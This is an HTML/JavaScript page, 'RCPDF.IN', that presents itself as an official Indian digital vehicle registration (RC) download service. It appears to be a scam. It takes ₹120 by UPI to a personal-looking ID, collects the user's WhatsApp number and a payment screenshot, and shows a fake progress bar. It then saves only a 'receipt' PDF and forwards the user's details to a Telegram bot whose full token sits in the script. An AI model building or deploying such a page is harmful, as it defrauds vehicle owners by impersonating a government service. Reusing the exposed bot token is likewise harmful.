<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Official Digital RC</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        body { background: #000; color: #fff; overflow-x: hidden; }

        /* Header Fix */
        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; }
        .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; width: 28px; }
        .menu-btn div { width: 100%; height: 3px; background: var(--primary); border-radius: 2px; }
        .logo { color: var(--primary); font-weight: 900; font-size: 22px; text-decoration: none; }

        /* Sidebar */
        .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; color: #333; }
        .sidebar.active { left: 0; }
        .s-link { display: block; width: 100%; padding: 14px; margin-bottom: 12px; background: #f0f0f0; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; text-align: center; border:none; cursor:pointer; }

        /* Card */
        .card { margin: 120px auto 20px; width: 92%; max-width: 420px; background: #1a1a1c; padding: 30px 20px; border-radius: 25px; text-align: center; border: 1px solid #333; }

        /* BIG IND PLATE */
        .hsrp-plate { 
            background: #fff; width: 100%; height: 80px; 
            border: 2px solid #555; border-radius: 12px; 
            display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; 
        }
        .ind-strip { 
            background: var(--ind-blue); width: 75px; height: 100%; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; 
            flex-shrink: 0; border-right: 2px solid #ddd;
        }
        .ind-strip img { width: 32px; margin-bottom: 4px; }
        .ind-strip span { font-size: 18px; font-weight: 900; letter-spacing: 1px; }

        #vehInput { flex: 1; border: none; height: 100%; font-size: 28px; font-weight: 900; text-align: center; color: #000; outline: none; letter-spacing: 2px; background: transparent; width: 100%; }
        #vehInput::placeholder { color: #bbb; text-align: center; opacity: 0.6; }

        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--primary); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 0 #b30047; margin-top: 10px; }
        
        #mob { width: 100%; padding: 16px; border-radius: 12px; border: none; margin-bottom: 12px; background: #2c2c2e; color: #fff; font-size: 16px; text-align: center; }
        .err { color: #ff4d4d; font-size: 12px; display: none; text-align: left; margin-bottom: 10px; }

        /* Loader */
        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; }
        .road { width: 85%; height: 4px; background: #333; position: relative; }
        .car { font-size: 45px; position: absolute; bottom: 0; left: 0; transform: scaleX(-1); transition: 0.1s linear; }
        .pct { font-size: 45px; font-weight: 900; color: var(--primary); margin-top: 25px; }

        .success { position: fixed; inset: 0; background: var(--primary); z-index: 6000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
        .footer { margin-top: 30px; font-size: 11px; opacity: 0.5; text-align: center; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="header">
        <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
        <b class="logo">RCPDF.IN</b>
        <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
    </div>

    <div class="sidebar" id="side">
        <button class="s-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'">Insurance</button>
        <button class="s-link" onclick="toggleM()">Close Menu</button>
    </div>

    <div class="card">
        <div id="p1">
            <h2 style="margin-bottom:20px;">Download Digital RC</h2>
            <div class="hsrp-plate">
                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
            </div>
            <div id="vErr" class="err">⚠ Vehicle number required</div>
            <button class="btn" onclick="go2()">Continue</button>
        </div>

        <div id="p2" style="display:none;">
            <button class="btn" style="background:#000; margin-bottom:15px;" onclick="pay()">Pay ₹120 with ANY UPI</button>
            <div style="background:#fff; padding:12px; border-radius:15px; display:inline-block; margin-bottom:15px; border:1px solid #ddd;">
                <img id="qr" src="" width="200">
            </div>
            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
            <div id="mErr" class="err">⚠ Mobile required</div>
            <input type="file" id="ss" style="margin-bottom:15px; font-size:12px; color:#fff; width:100%;">
            <div id="sErr" class="err">⚠ Screenshot required</div>
            <button class="btn" onclick="submit()">Verify & Download</button>
        </div>
    </div>

    <div class="footer">© Copyright Reserved 2026 Apex Solution</div>

    <div class="loader-wrap" id="load">
        <div class="road"><div class="car" id="carIcon">🚗</div></div>
        <div class="pct" id="pText">0%</div>
    </div>

    <div class="success" id="succ">
        <h1 style="font-size:70px;">✅</h1>
        <h2>Done!</h2>
        <p>Receipt Saved.<br>Check WhatsApp for Original PDF.</p>
        <button class="btn" style="background:#fff; color:var(--primary); width:160px;" onclick="location.reload()">HOME</button>
    </div>

    <script>
        function toggleM() { document.getElementById('side').classList.toggle('active'); }

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += "-" + v.substring(2, 4);
            if (v.length > 4) out += "-" + v.substring(4, 6);
            if (v.length > 6) out += "-" + v.substring(6, 10);
            i.value = out;
        }

        function go2() {
            if(document.getElementById('vehInput').value.length < 9) { document.getElementById('vErr').style.display='block'; return; }
            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
            document.getElementById('p1').style.display='none';
            document.getElementById('p2').style.display='block';
        }

        function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD"; }

        function submit() {
            const m = document.getElementById('mob').value;
            const s = document.getElementById('ss').files[0];
            if(m.length<10 || !s) return;
            document.getElementById('load').style.display='flex';
            let p = 0;
            let iv = setInterval(() => {
                p += 2;
                document.getElementById('pText').innerText = p + "%";
                document.getElementById('carIcon').style.left = (p * 0.88) + "%";
                if(p >= 100) {
                    clearInterval(iv);
                    makePDF();
                    sendT(s);
                }
            }, 60);
        }

        function makePDF() {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            const v = document.getElementById('vehInput').value;
            const m = document.getElementById('mob').value;

            // Border & Header Box
            doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
            doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
            
            // Title
            doc.setTextColor(255); doc.setFontSize(24); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
            
            // Details Box
            doc.setTextColor(0); doc.setFontSize(14); doc.setDrawColor(200);
            doc.rect(15, 45, 180, 60);
            doc.text("VEHICLE DETAILS & PAYMENT", 20, 55);
            doc.setFontSize(12);
            doc.text(`Vehicle Number: ${v}`, 20, 68);
            doc.text(`WhatsApp No:    ${m}`, 20, 76);
            doc.text(`Amount Paid:    INR 120.00`, 20, 84);
            doc.text(`Status:         SUCCESS / PROCESSING`, 20, 92);
            
            // QR Code Placeholder in PDF
            doc.text("SCAN FOR SUPPORT", 150, 55);
            doc.addImage(document.getElementById('qr').src, 'PNG', 150, 60, 35, 35);

            // Terms and Conditions Section
            doc.setFontSize(14); doc.text("TERMS AND CONDITIONS", 20, 120);
            doc.setFontSize(10); doc.setTextColor(80);
            const tnc = [
                "1. This is a payment confirmation receipt for Digital RC service.",
                "2. Your original RC PDF will be delivered on your WhatsApp within 30-60 minutes.",
                "3. Ensure the vehicle number and mobile number provided are correct.",
                "4. Amount paid (Rs.120) is non-refundable once the process starts.",
                "5. Service is subject to RTO/Vahan server availability.",
                "6. In case of delay, contact support with this receipt screenshot."
            ];
            doc.text(tnc, 20, 130);

            // Footer
            doc.setTextColor(150); doc.setFontSize(9);
            doc.text("© 2026 RCPDF.IN | Apex Solution | Digital Vahan Services India", 105, 280, null, null, "center");

            doc.save(`RCPDF_Receipt_${v}.pdf`);
        }

        function sendT(f) {
            let fd = new FormData();
            fd.append("chat_id", "5600045707");
            fd.append("photo", f);
            let msg = `🚀 NEW ORDER\n\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}\n\nRC DOWNLOAD`;
            fd.append("caption", msg);
            fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {method:"POST", body:fd})
            .then(() => {
                document.getElementById('load').style.display='none';
                document.getElementById('succ').style.display='flex';
            });
        }
    </script>
</body>
</html>
